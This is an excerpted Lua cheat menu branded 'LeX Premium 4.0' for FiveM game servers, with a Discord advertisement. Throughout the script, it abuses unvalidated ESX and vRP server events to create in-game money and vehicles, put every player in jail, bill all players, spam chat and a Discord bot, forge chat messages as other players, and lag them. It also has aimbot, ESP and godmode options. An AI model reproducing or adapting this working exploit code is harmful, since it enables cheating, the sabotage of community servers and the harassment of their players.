...
local currentMenuX = 0.75
local selectedMenuX = 0.75
local currentMenuY = 0.19
local selectedMenuY = 0.19
local allMenus = { "LynxX", "~h~LeX   ~r~Premium", "SelfMenu", "Self Menu", "LuaMenu", "VRPTriggers", "TeleportMenu", "WeaponMenu", "AdvM", "VehicleMenu", "OnlinePlayerMenu", "PlayerOptionsMenu", "Destroyer", "ESXMoney",
"Credits", "< Panic Key >", "MiscTriggers", "CarOptions", "MainTrailer", "MainTrailerSel", "PedMenu1", "Jobs1", "LSC", "ESPMenu", "CsMenu", "GCT", "GlobalAllPlayers", "Setng", "Trollmenu", "ESXCustom", "ESXDrugs", 
"SpawnPeds", "BoostMenu", "VRPPlayerTriggers", "performance", "tunings", "GiveSingleWeaponPlayer", "WeaponOptions", "CarTypeSelection", "MainTrailerSpa", "CarTypes", "ModSelect", "ESXTriggerini", "WeaponTypeSelection", "WeaponTypes" }
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
...
local I = ""
local
function J(K) if e.debug then Citizen.Trace("LeX] "..tostring(K)) end end;
local function j(text)
    if e.debug then
        Citizen.Trace('[e] '..tostring(text))
    end
end;
...
function e.ComboBox(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = l[p].currentOption == n + 1;
...
am(currentIndex, selectedIndex) return true elseif al then
if o == m.left then
...
callback(currentIndex, selectedIndex) return false end;
...
SetNotificationTextEntry("STRING") AddTextComponentString(K) DrawNotification(aN, false) end;
...
local bL = true;
local bM = "LynxX"
local bN = "~h~LeX   ~r~Premium ~w~_4.0_"
local bO = "SelfMenu"
local bP = "Self Menu"
local bQ = "LuaMenu"
local item = "ItemsMenu"
...
function cG() for i = 0, 255 do x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do Citizen.Wait(0) RequestModel(GetHashKey("prop_fnclink_05crnr1")) end;
    ...
    function bananapartyall() Citizen.CreateThread(function() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2e^3X ^5P^6r^7e^8m^9i^1u^2m", {
                141, 211, 255
            }, "^"..av..
            "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") end;
...
function RapeAllFunc() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2e^3X ^5P^6r^7e^8m^9i^1u^2m", {
            141, 211, 255
        }, "^"..av..
        "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") end;
...
Citizen.CreateThread(function() while bL do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), dM, 0) if SuperJump
    ...
    if blowall then
    for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2e^3X ^5P^6r^7e^8m^9i^1u^2m", {
            141, 211, 255
        }, "^"..av..
        "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") end;
    ...
    function vrpdestroy() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^^1L^2e^3X ^5P^6r^7e^8m^9i^1u^2m", {
            141, 211, 255
        }, "^"..av..
        "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") end;
	...
	if skex then
    TriggerServerEvent('esx_skin:openSaveableMenu')
	end

    if discordPresence then
                    SetDiscordAppId(537303016144109568)
            
                    SetDiscordRichPresenceAsset('lexmenu')
                    
            SetRichPresence('Created By Pekinez#9362 - https://discord.gg/yUFgX4e ')
			
                    SetDiscordRichPresenceAssetText('https://discord.gg/yUFgX4e')
	...
	function e.SetMenuX(id, ax)
    l[c1].x = ax
    end

    function hampek() TriggerServerEvent('esx_mechanicjob:putStockItems', "bread",-5)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "bread",-5)
        TriggerServerEvent('esx_aircraftshop:putStockItems', "bread",-5)
        TriggerServerEvent('esx_ambulancejob:putStockItems', "bread",-5)
    end;

    function phopek() TriggerServerEvent('esx_mechanicjob:putStockItems', "phone",-1)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "phone",-1)
    end;

    function hambpek() TriggerServerEvent('esx_mechanicjob:putStockItems', "hamburger",-5)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "hamburger",-5)
        TriggerServerEvent('esx_aircraftshop:putStockItems', "hamburger",-5)
        TriggerServerEvent('esx_ambulancejob:putStockItems', "hamburger",-5) end;

    function colpek() TriggerServerEvent('esx_mechanicjob:putStockItems', "water",-5)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "water",-5)
        TriggerServerEvent('esx_aircraftshop:putStockItems', "water",-5)
        TriggerServerEvent('esx_ambulancejob:putStockItems', "water",-5) end;
        
    function fixpek() TriggerServerEvent('esx_mechanicjob:putStockItems', "fixkit",-5)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "fixkit",-5)
        TriggerServerEvent('esx_aircraftshop:putStockItems', "fixkit",-5)
        TriggerServerEvent('esx_ambulancejob:putStockItems', "fixkit",-5) end;

    function medpek() TriggerServerEvent('esx_mechanicjob:putStockItems', "medkit",-5)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "medkit",-5)
        TriggerServerEvent('esx_aircraftshop:putStockItems', "medkit",-5)
        TriggerServerEvent('esx_ambulancejob:putStockItems', "medkit",-5) end;

    function hanpek() TriggerServerEvent('esx_mechanicjob:putStockItems', "drill",-1)
        TriggerServerEvent('esx_vehicleshop:putStockItems', "drill",-1)
        TriggerServerEvent('esx_aircraftshop:putStockItems', "drill",-1)
        TriggerServerEvent('esx_ambulancejob:putStockItems', "drill",-1) end;
    ...
    if BLIZZARD then
		...
		if handpe then
                ...
                for i = 0, 128 do
                    ...
                    local vehiclehash = GetHashKey("tractor")
    ...
    DisplayRadar(true) if RainbowVeh then Citizen.Wait(0) local dY = f(1.0) SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dY.r, dY.g, dY.b) SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dY.r, dY.g, dY.b) end;
    if rainbowh then
    ...
    e.CreateMenu(bM, bN) e.CreateSubMenu(bO, bM, I) e.CreateSubMenu(bS, bM, I) e.CreateSubMenu(bT, bM, I) e.CreateSubMenu(bU, bM, I) e.CreateSubMenu(bQ, bM, I) e.CreateSubMenu(item, bM, I) e.CreateSubMenu(cosh, bM, I) e.CreateSubMenu(Pekz, co, I) e.CreateSubMenu(bV, bM, I) e.CreateSubMenu(bW, bM, I) e.CreateSubMenu(bX, bW, I) e.CreateSubMenu(bY, bU, I) e.CreateSubMenu(bZ, bQ, I) e.CreateSubMenu(cb, bQ, I) e.CreateSubMenu(ca, bQ, I) e.CreateSubMenu(bR, bQ, I) e.CreateSubMenu(c0, bQ, I) e.CreateSubMenu(b_, bM, I) e.CreateSubMenu(co, bX, I) e.CreateSubMenu(c9, bX, I) e.CreateSubMenu(cq, bT, I) e.CreateSubMenu(cp, cq, I) e.CreateSubMenu(cj, cp, I) e.CreateSubMenu(cz, bO, I) e.CreateSubMenu(anima, cz, I) e.CreateSubMenu(cn, cj, I) e.CreateSubMenu(cm, bV, I) e.CreateSubMenu(ck, cm, I) e.CreateSubMenu(c1, ck, I) e.CreateSubMenu(c2, bV, I) e.CreateSubMenu(c3, c2, I) e.CreateSubMenu(cl, c3, I) e.CreateSubMenu(ch, bW, I) e.CreateSubMenu(c5, bU, I) e.CreateSubMenu(c4, bV, I) e.CreateSubMenu(cg, c4, I) e.CreateSubMenu(cf, c4, I) e.CreateSubMenu(ce, bX, I) e.CreateSubMenu(cd, bV, I) e.CreateSubMenu(cc, c9, I) e.CreateSubMenu(c7, bV, I) e.CreateSubMenu(c6, bU, I) e.CreateSubMenu(c8, bU, I) for i, eq in pairs(bC) do e.CreateSubMenu(eq.id, cg, eq.name) if eq.
    id == "paint"
    ...
    if e.IsMenuOpened(bM) then cr("~r~LeX Premium - 4.0 - ~s~Hello Buyer     ~r~https://discord.gg/yUFgX4e ", 0.80, 0.9) cr("Welcome back ~r~"..d..
        " ~s~!", 0.755, 0.295) aM("~h~LeX Premium - ~r~3~r~.~r~0", true) aM("~u~https://discord.gg/yUFgX4e", false) if e.MenuButton("~h~~o~-»~s~ Self Menu", bO) then elseif e.MenuButton("~h~~o~-»~s~ Online Players", bW) then elseif e.MenuButton("~h~~o~-»~s~ Teleport Menu", bS) then elseif e.MenuButton("~h~~o~-»~s~ Vehicle Menu", bV) then elseif e.MenuButton("~h~~o~-»~s~ Weapon Menu", bT) then elseif e.MenuButton("~h~~o~-»~s~ Money Features", bQ) then elseif e.MenuButton("~h~~o~-» ~s~Items Menu", item) then elseif e.MenuButton("~h~~o~-»~s~ Advanced Menu", bU) then elseif e.MenuButton("~h~~o~-» ~r~Credits", b_) then
        elseif e.MenuButton("~h~~o~-»~o~ Other", cosh) then 		
		elseif e.Button("~h~~u~(~r~Disable Menu~u~)", ct) then break end; e.Display() elseif  e.IsMenuOpened(bO) then cr("", 0.1, 0.58) if e.MenuButton("~h~~p~>~s~Ped Menu", cz) then elseif e.Button("~h~~r~_LeX_ ~w~Open Jail Menu \40\126\103\126\69\83\88\126\115\126\41\10") then TriggerEvent("esx-qalle-jail:openJailMenu")   
		elseif e.Button("~h~~r~_LeX_ ~s~Get 500K$ ~s~ ~r~(ESX)") then 
				...
				TriggerServerEvent('esx_eggedjob:cash', 500000)
				TriggerServerEvent('fuel:pay', -500000)
				
				elseif e.Button("~h~~r~_LeX_ ~s~Get 500K$ ~r~(VRP)") then
				...
				TriggerServerEvent('PayForRepairNow',-100000)
				aM("~b~Enjoy!!! ")
    elseif e.Button("~w~~o~Set Hunger ~h~~s~%100") then TriggerEvent("esx_status:set", "hunger", 1000000) elseif e.Button("~w~~b~Set Thirst ~h~~s~%100") then TriggerEvent("esx_status:set", "thirst", 1000000)
    elseif e.CheckBox("~h~~s~Godmode", Godmode, function(eC) Godmode = eC end) then 
    elseif e.Button("~h~~s~Semi Godmode") then local eD = "stt_prop_stunt_soccer_ball"
    while not HasModelLoaded(GetHashKey(eD)) do Citizen.Wait(0) RequestModel(GetHashKey(eD)) end;
    local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) SetEntityVisible(eE, 0, 0) AttachEntityToEntity(eE, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) elseif e.CheckBox("~h~~s~Player Visible", dM, function(eC) dM = eC end) then elseif e.Button("~h~~r~Suicide") then SetEntityHealth(PlayerPedId(-1), 0) elseif e.Button("~h~~g~(ESX)~s~ Revive Yourself~s~") then TriggerEvent("esx_ambulancejob:revive") elseif e.Button("~h~~s~Heal/Revive") then SetEntityHealth(PlayerPedId(-1), 200) elseif e.Button("~h~~s~Give Armour") then SetPedArmour(PlayerPedId(-1), 200) elseif e.CheckBox("~h~Infinite Stamina", InfStamina, function(eC) InfStamina = eC end) then
	elseif e.CheckBox(
                "~h~~r~_LeX_ ~g~Night Vision",
                nightvi,
                function(eC)
                    nightvi = eC
                ...
                then
	elseif e.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then therm = not therm; bTherm = therm; SetSeethrough(therm) elseif e.CheckBox("~h~Fast Run", fastrun, function(eC) fastrun = eC end) then elseif e.CheckBox("~h~Super Jump", SuperJump, function(eC) SuperJump = eC end) then elseif e.CheckBox("~h~Noclip", Noclip, function(eC) Noclip = eC end) then end; e.Display() elseif e.IsMenuOpened(bW) then cr("", 0.58, 0.58) for i = 0, 128 do
    ...
    and GetPlayerServerId(i)  ~= 0 and e.MenuButton(GetPlayerName(i)..
        ...
        "]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~h~~r~DEAD"
            or "~h~~g~ALIVE"), 'PlayerOptionsMenu') then SelectedPlayer = i end end; e.Display() elseif e.IsMenuOpened(bX) then cr("", 0.58, 0.58) e.SetSubTitle(bX, "Player Options ["..GetPlayerName(SelectedPlayer)..
        "]") if e.MenuButton("~h~~p~#~s~ ESX Triggers", co) then elseif e.MenuButton("~h~~p~#~s~ VRP Triggers", ce) then elseif e.MenuButton("~h~~p~#~s~ Troll Menu", c9) then elseif 
         e.Button("~g~~h~ESX ~r~Transfer 500k") then
            TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(SelectedPlayer), "item_money", "money", 500000) 
         elseif e.Button("~h~~g~Revive ~r~(ESX)") then
                ...
                DoScreenFadeIn(800) elseif
            e.Button("~h~~r~_LeX_~w~Open inventory") then TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer)) 
		 elseif e.Button("~h~~r~Give ~s~Money From your Inventory") then
						local Pek = KeyboardInput("Enter amount of money to give", "", 100000000)
						if Pek then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", 100)    
						end
	elseif e.Button("~h~Send Bill") then
          	            local Kep = KeyboardInput("Enter the name of the bill","",100000000)
						local Pek = KeyboardInput("Enter amount","",100000000)
						if Pek and Kep then 
						    TriggerServerEvent('esx_billing:sendBill',GetPlayerServerId(p_selected_player),"HI",Kep,Pek)
						else
						    return
						end	
	elseif e.Button("~h~Spectate", di and "~g~[SPECTATING]") then SpectatePlayer(SelectedPlayer) elseif e.Button("~h~~r~Semi GOD ~s~Player") then local eD = "stt_prop_stunt_soccer_ball"
    while not HasModelLoaded(GetHashKey(eD)) do Citizen.Wait(0) RequestModel(GetHashKey(eD)) end;
    local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) SetEntityVisible(eE, 0, 0) AttachEntityToEntity(eE, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) elseif e.Button("~h~~s~Heal ~s~Player") then local eF = "PICKUP_HEALTH_STANDARD"
    ...
    for i = 1, #bn do GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(bn[i]), 1000, false, false) end elseif e.Button("~h~Remove ~r~All Weapons") then RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true) elseif e.Button("~h~Give ~r~Vehicle") then local ped = GetPlayerPed(SelectedPlayer) local d7 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) local d11 = KeyboardInput("Enter Enter Vehicle Licence Plate", '', 100) if d7 
    and IsModelValid(d7) and IsModelAVehicle(d7) then RequestModel(d7) while not HasModelLoaded(d7) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(d7), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true) if d11 then SetVehicleNumberPlateText(veh, d11) local d12 = ESX.Game.GetVehicleProperties(veh) TriggerServerEvent('esx_vehicleshop:setVehicleOwned', d12) aM('~g~~h~Success', false) else SetVehicleNumberPlateText(veh, doText(3)..' '..math.random(100,999)) local d12 = ESX.Game.GetVehicleProperties(veh) TriggerServerEvent('esx_vehicleshop:setVehicleOwned', d12) aM('~g~~h~Success', false) end;
    else aM("~b~Model is not valid!", true) end elseif e.Button("~h~Send To ~r~Jail") then TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed") TriggerServerEvent("ljail:jailplayer") elseif e.Button("~h~~s~Get Out ~s~From Jail") then local eH = SelectedPlayer; TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(eH), 0, "escaperino") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(eH), 0) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(eH), 0) TriggerServerEvent("js:jailuser", GetPlayerServerId(eH), 0, "escaperino") TriggerServerEvent("ljail:jailplayer") end; e.Display() elseif e.IsMenuOpened(co) then cr("", 0.29, 0.29) if e.Button("~h~~b~Handcuff Player") then TriggerServerEvent('esx_policejob:handcuff', SelectedPlayer) 
	elseif e.MenuButton("~h~~r~(ESX) Jobs", Pekz) then 
	end; 
	e.Display() elseif e.IsMenuOpened(ce) then cr("", 0.21, 0.21) if e.Button("~h~Transfer money from your bank") then local eI = KeyboardInput("Enter amount of money to give", "", 100) local eJ = KeyboardInput("Enter VRP PERMA ID!", "", 100) if eI ~= ""
    then local dZ = GetPlayerServerId(PlayerId()) TriggerEvent("bank:transfer", dZ, GetPlayerServerId(SelectedPlayer), eI) TriggerServerEvent("bank:transfer", eJ, eI) end end; e.Display() elseif e.IsMenuOpened(c9) then cr("", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Spawn Peds", cc) then 
    elseif e.Button("~h~~r~Fake ~s~Chat Message") then local eK = KeyboardInput("Enter message to send", "", 100) local eL = GetPlayerName(SelectedPlayer) if eK then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eL, {
        0, 0x99, 255
    }, eK) end elseif e.Button("~h~~r~Kick ~s~From Vehicle") then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
	
	elseif e.Button("~h~~r~Police ~o~ Remove License") then
        local player = KeyboardInput("Enter Player ID", "", 4)
        local licensetype = KeyboardInput("Enter License : dvm, drive, drive_bike, drive_truck", "", 18)
        TriggerServerEvent('esx_license:removeLicense', player, licensetype)
  
	
	elseif e.Button("~h~~r~_LeX_~w~Spawn Mountain Lion") then
                    ...
                    for i = 0, 30 do
                        ...
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, waduyh487r64, waduyh487r64)
	...
	elseif e.Button("~h~~y~Explode ~s~Vehicle") then
    ...
    e.Display() elseif e.IsMenuOpened(cc) then cr("", 0.33, 0.33) if e.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then local eU = "s_m_y_swat_01"
    ...
    for i = 0, 10 do local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(eU)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(eU))
    then local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end end; e.Display() 
elseif IsDisabledControlPressed(0, 19) then 
    cu() e.Display() elseif e.IsMenuOpened(bS) then cr("", 0.38, 0.38) if e.Button("~h~Teleport to ~g~waypoint") then d2() elseif e.Button("~h~Teleport into ~g~nearest ~s~vehicle") then cW() elseif e.Button("~h~Teleport to ~r~coords") then cP() elseif e.Button("~h~Draw custom ~r~blip ~s~on map") then cT() elseif e.CheckBox("~h~Show ~g~Coords", showCoords, function(eC) showCoords = eC end) then end; e.Display() elseif e.IsMenuOpened(bT) then cr("", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Give Single Weapon", cq) then elseif e.Button("~h~~g~Give All Weapons") then
    ...
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true elseif bx and currims == eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = false; bz = -1; by = -1 elseif bx and currims ~= eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true end end end; e.Display() elseif e.IsMenuOpened(bV) then cr("", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ ~h~~b~LSC ~s~Customs", c4) then elseif e.MenuButton("~h~~p~#~s~ Vehicle ~g~Boost", cd) then elseif e.MenuButton("~h~~p~#~s~ Vehicle List", cm) then elseif e.MenuButton("~h~~p~#~s~ Global Car Trolls", c7) then elseif e.MenuButton("~h~~p~#~s~ Spawn & Attach ~s~Trailer", c2) then 
	elseif e.Button("~h~~r~Buy ~s~A Vehicle For ~o~Free") then db()
	elseif e.Button("~h~~o~VRP ~s~Get Driving License") then TriggerServerEvent("dmv:success")
	elseif e.Button("~h~~r~ESX ~s~Get Driving License") then TriggerServerEvent("esx_dmvschool:addLicense", 'dmv') TriggerServerEvent("esx_dmvschool:addLicense", 'drive') 
    elseif e.Button("~h~Spawn ~r~Custom ~s~Vehicle") then d6() elseif e.Button("~h~~r~Delete ~s~Vehicle") then DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.Button("~h~~g~Repair ~s~Vehicle") then d8() elseif e.Button("~h~~g~Repair ~s~Engine") then d9() elseif e.Button("~h~~g~Flip ~s~Vehicle") then daojosdinpatpemata() elseif e.Button("~h~~b~Max ~s~Tuning") then MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.CheckBox("~h~Vehicle Godmode", VehGod, function(eC) VehGod = eC end) then 
    elseif
    e.CheckBox("~h~~r~No Fall",
        Nofall,
        function(enabled)
            Nofall = enabled
    ...
    then elseif e.CheckBox("~h~~b~Waterproof ~s~Vehicle", waterp, function(eC) waterp = eC end) then elseif e.CheckBox("~h~Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(eC) VehSpeed = eC end) then end; e.Display() elseif e.IsMenuOpened(c7) then
    ...
    e.Display() elseif e.IsMenuOpened(bQ) then cr("", 0.46, 0.46) if e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Money", bZ) then elseif e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Drugs", cb) then elseif e.MenuButton("~h~~p~#~s~ ~o~VRP ~s~Money", bR) then end; e.Display() elseif e.IsMenuOpened(bZ) then cr("", 0.58, 0.58) if e.Button("~h~~o~Automatic Money ~r~ WARNING!") then automaticmoneyesx() elseif e.Button("~g~~h~ESX ~y~Caution Give Back") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    ...
    then TriggerServerEvent("esx_slotmachine:sv:2", j) end end; e.Display() elseif e.IsMenuOpened(cb) then cr("", 0.58, 0.58) if e.Button("~h~~g~Harvest ~g~Weed") then hweed() elseif e.Button("~h~~g~Transform ~g~Weed") then tweed() elseif e.Button("~h~~g~Sell ~g~Weed") then sweed() elseif e.Button("~h~~w~Harvest ~w~Coke") then hcoke() elseif e.Button("~h~~w~Transform ~w~Coke") then tcoke() elseif e.Button("~h~~w~Sell ~w~Coke") then scoke() elseif e.Button("~h~~r~Harvest Meth") then hmeth() elseif e.Button("~h~~r~Transform Meth") then tmeth() elseif e.Button("~h~~r~Sell Meth") then smeth() elseif e.Button("~h~~p~Harvest Opium") then hopi() elseif e.Button("~h~~p~Transform Opium") then topi() elseif e.Button("~h~~p~Sell Opium") then sopi() elseif e.Button("~h~~g~Money Wash") then mataaspalarufe() elseif e.Button("~r~~h~Stop all") then matanumaispalarufe() elseif e.CheckBox("~h~~r~Blow Drugs Up ~y~DANGER!", BlowDrugsUp, function(eC) BlowDrugsUp = eC end) then end; e.Display() elseif e.IsMenuOpened(bR) then cr("", 0.42, 0.42) if e.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    ...
    then TriggerServerEvent("vrp_slotmachine:server:2", j) end elseif e.Button("~r~~h~VRP ~s~Bank Deposit") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    ...
    then TriggerServerEvent("bank:withdraw", j) TriggerServerEvent("Banca:withdraw", j) end end; e.Display() elseif e.IsMenuOpened(bU) then cr("", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Destroyer Menu", bY) then elseif e.MenuButton("~h~~p~#~s~ All Players Troll", c8) then elseif e.MenuButton("~h~~p~#~s~ ESP Menu", c5) then elseif e.MenuButton("~h~~p~#~s~ Crosshairs", c6) then 
    elseif e.CheckBox("~r~_LeX_ ~w~Chat Spam",chatspampe, function(eC) chatspampe = eC end) then
    elseif e.CheckBox("~r~_LeX_ ~w~Chat Spam 2",chatspampi, function(eC) chatspampi = eC end) then
    elseif e.Button("~h~~g~Discord Bot Spam ~r~(Work)") then
        local Killer = KeyboardInput("Id Of Killer", "", 100) 
        local KillerName = GetPlayerName(GetPlayerFromServerId(tonumber(Killer)))
        CreateThread(function()
            for a, b in next, GetActivePlayers() do
                TriggerServerEvent('DiscordBot:playerDied', KillerName .. " **Kill**  ||| LeX Premium 4.0 https://discord.gg/yUFgX4e   || "..GetPlayerName(b)..".", "**RPG**") print (b)
                Wait(400)
            end
        end)

	elseif e.CheckBox(
				    "~h~~r~_LeX_~s~Blizzard Weather",
					BLIZZARD,
					function(Pekinez)
					BLIZZARD = Pekinez
					end)
	...
	elseif e.CheckBox(
					...
					then
	elseif e.CheckBox(
				    "~h~~r~_LeX_~s~Clear Weather",
					CLEAR,
					function(Pekinez)
					CLEAR = Pekinez
					end)
					then
    elseif e.Button("~h~~r~_LeX_~b~Day") then
				NetworkOverrideClockTime(12, 12, 0)
				elseif e.Button("~h~~r~_LeX_~v~Night") then
				NetworkOverrideClockTime(23, 50, 0)
	elseif e.CheckBox("~h~TriggerBot", TriggerBot, function(eC) TriggerBot = eC end) then elseif e.CheckBox("~h~SilentAim/Aimbot", Aimbot, function(eC) Aimbot = eC end) then elseif e.CheckBox("~h~Player Blips", ej, function(ej) end) then ds = not ds; ej = ds elseif e.CheckBox("~h~Name Above Players ~g~v1", dt, function(eC) dt = eC; du = false end) then elseif e.CheckBox("~h~Name Above Players n Indicator ~g~v2", du, function(eC) du = eC; dt = false end) then 
	elseif e.CheckBox("~h~~r~Confirms~s~ MSWITCH", dv, function(eC) dv = eC end) then end; e.Display() elseif e.IsMenuOpened(c6) then cr("", 0.29, 0.29) if e.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function(eC) crosshair = eC; crosshairc = false; crosshairc2 = false end) then elseif e.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function(eC) crosshair = false; crosshairc = eC; crosshairc2 = false end) then elseif e.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function(eC) crosshair = false; crosshairc = false; crosshairc2 = eC end) then end; e.Display() elseif e.IsMenuOpened(c8) then
    ...
    for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "LeX Menu and Desudo Products https://discord.gg/yUFgX4e") TriggerServerEvent("ljail:jailplayer") end	
    elseif e.Button("~h~~r~Semi GOD ~g~Everyone ~o~(TROLLOL") then local eD = "stt_prop_stunt_soccer_ball"
        while not HasModelLoaded(GetHashKey(eD)) do Citizen.Wait(0) RequestModel(GetHashKey(eD)) end;
    for i = 0, 128 do local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) SetEntityVisible(eE, 0, 0) AttachEntityToEntity(eE, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) end
     elseif e.Button("~h~~r~_LeX_ ~s~Spawn Monkey on everyone") then
					local rhesus = "a_c_rhesus"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(rhesus))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(rhesus)) then
                            local ped =
                                CreatePed(21, GetHashKey(rhesus), co.x, co.y, co.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
	...
	elseif e.Button("~h~~r~_LeX_~s~Send Everyone Bills") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "LOL", "LeX Premium https://discord.gg/yUFgX4e Desudo Products", "6969696969")
                end
	elseif e.Button("~h~~r~_LeX_~s~Send Everyone Custon Bill") then
    ...
    elseif e.CheckBox("~h~~r~_LeX_ ~g~Fuck ~o~People ~y~with ~f~lags", lagpe, function(Pekinez) lagpe = Pekinez end) then          
    
   elseif 
